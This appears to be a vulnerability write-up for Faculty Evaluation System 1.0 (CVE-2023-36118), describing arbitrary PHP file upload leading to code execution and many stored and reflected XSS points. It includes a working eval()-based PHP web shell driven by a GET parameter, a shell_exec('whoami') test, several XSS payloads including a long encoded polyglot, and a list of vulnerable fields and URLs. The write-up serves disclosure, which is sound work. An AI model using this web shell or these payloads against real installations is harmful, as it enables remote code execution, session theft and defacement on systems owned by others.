# Faculty Evaluation System 1.0

+ Vendor Homepage: https://www.sourcecodester.com/php/14635/faculty-evaluation-system-using-phpmysqli-source-code.html
+ Software Link: https://www.sourcecodester.com/sites/default/files/download/oretnom23/eval_2.zip
+ Tested on: XAMPP + win10
+ XSS vuln CVE ID: CVE-2023-36118
+ CVSS v3.1 `AV:L/AC:L/PR:H/UI:R/S:U/C:L/I:L/A:L/E:F/RL:W/RC:R/CR:L/IR:L/AR:L/MAV:L/MAC:L/MPR:H/MUI:R/MS:U/MC:L/MI:L/MA:L`

![image](https://github.com/Trinity-SYT-SECURITY/arbitrary-file-upload-RCE/assets/96654161/185ff8b6-5953-4219-9ef9-ab9f655ec5f3)


First, create a simple PHP script to trigger the vulnerability. The following PHP code will utilize the GET parameter and execute it through the eval() function:

**The $_GET[""] is passed to the eval() function, which means that the string will be interpreted as valid PHP code and executed. It allows the attacker to execute arbitrary PHP code.**

```php
<?php $code = $_GET['code'];
eval($code); ?>
```

When you see this page, you will know that the program has executed successfully. It seems that other tests can be performed.

![image](https://github.com/Trinity-SYT-SECURITY/arbitrary-file-upload-RCE/assets/96654161/7dbac24e-7e55-4050-8014-0b1ab115f15c)

+ echo shell_exec('whoami');

![](https://hackmd.io/_uploads/B1KnDvgw2.png)

After pressing Set for each option
![](https://hackmd.io/_uploads/r1WcdDgw3.png)

stored xss
Entering the payload in the bottom box of most projects will trigger ->

I will write the details of the affected part at the end

[xss payload](https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt)
```
<script>alert(1)</script>
<img src=1 onerror=alert(1)>
<iframe src=javascript:alert(1)>
....

```

![](https://hackmd.io/_uploads/B1J2Dtlvn.png)
![](https://hackmd.io/_uploads/SyKpwFevh.png)

![](https://hackmd.io/_uploads/ByG2_Pevn.png)
![](https://hackmd.io/_uploads/Bys_b_lP2.png)
![](https://hackmd.io/_uploads/H1ysROxP3.png)


More interesting is this payload

```
xss%20%22%3E%3E%3Cmarquee%3E%3Cimg%20src=x%20onerror=confirm(/OPENBUGBOUNTY/)%3E%3C/marquee%3E%22%20%3E%3C/plaintext\%3E%3C/|\%3E%3Cplaintext/onmouseover=prompt(/OPENBUGBOUNTY/)%20%3E%3Cscript%3Eprompt(/OPENBUGBOUNTY/)%3C/script%3E@gmail.com%3Cisindex%20formaction=javascript:alert(1)%20type=submit%3E%27--%3E%22%20%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/script%3E%22%3E%3Cimg/id=%22confirm&lpar;%20OPENBUGBOUNTY)%22/alt=%22/%22src=%22/%22onerror=eval(id&%23x29;%3E%27%22%3E%3Cimg%20src=%22http:%20www.openbugbounty.org/images/design/openbugbounty-logo.png%22%3E%20%EF%BF%BC&show;=xss%20%22%3E%3E%3Cmarquee%3E%3Cimg%20src=x%20onerror=confirm(/OPENBUGBOUNTY/)%3E%3C/marquee%3E%22%20%3E%3C/plaintext\%3E%3C/|\%3E%3Cplaintext/onmouseover=prompt(/OPENBUGBOUNTY/)%20%3E%3Cscript%3Eprompt(/OPENBUGBOUNTY/)%3C/script%3E@gmail.com%3Cisindex%20formaction=javascript:alert(1)%20type=submit%3E%27--%3E%22%20%3E%3C/script%3E%3Cscript%3Ealert(1)%3C/s
```
![](https://hackmd.io/_uploads/HyAyXOeP2.png)

Stored xss will cause
xss is triggered every time the page is visited

Affected vulnerable blocks:
```
On the page http://localhost/eval/, under "Manage Account," if an XSS payload is entered in the "First Name" and "Last Name" fields, it can trigger stored XSS.

On the page http://localhost/eval/index.php?page=, after entering a reflected XSS payload in the "page=" parameter, it can trigger an attack.

On the page http://localhost/eval/index.php?page=subject_list, under the "Manage subject" setting in the "Action" section, if an XSS payload is entered in the "Description" and "Subject" fields, it can trigger stored XSS.

On the page http://localhost/eval/index.php?page=class_list, under the "Manage class" setting in the "Action" section, if an XSS payload is entered in any of the fields, it can trigger stored XSS.

On the page http://localhost/eval/index.php?page=academic_list, under the "Manage" setting in the "Action" section, if an XSS payload is entered in the "Year" field, it can trigger stored XSS.

On the page http://localhost/eval/index.php?page=questionnaire, under the "Manage" setting in the "Action" section, in the "Question" field at the bottom of the page, if an XSS payload is entered, it can trigger stored XSS.

On the page http://localhost/eval/index.php?page=criteria_list, in the "Criteria" field, if an XSS payload is entered, it can trigger stored XSS.

On any page under http://localhost/eval/index.php?page=faculty_list, after clicking "Edit" in the "Action" column, on the page http://localhost/eval/index.php?page=edit_faculty&id=, under the "Edit Faculty" section, if an XSS payload is entered in the "School ID," "First Name," and "Last Name" fields, it can trigger stored XSS.

On any page under http://localhost/eval/index.php?page=student_list, after clicking "Edit" in the "Action" column, on the respective page, in the "School ID," "First Name," and "Last Name" fields, if an XSS payload is entered, it can trigger stored XSS.

On any page under http://localhost/eval/index.php?page=user_list, after clicking "Edit" in the "Action" column, on the respective page, in the "First Name" and "Last Name" fields, if an XSS payload is entered, it can trigger stored XSS.
```
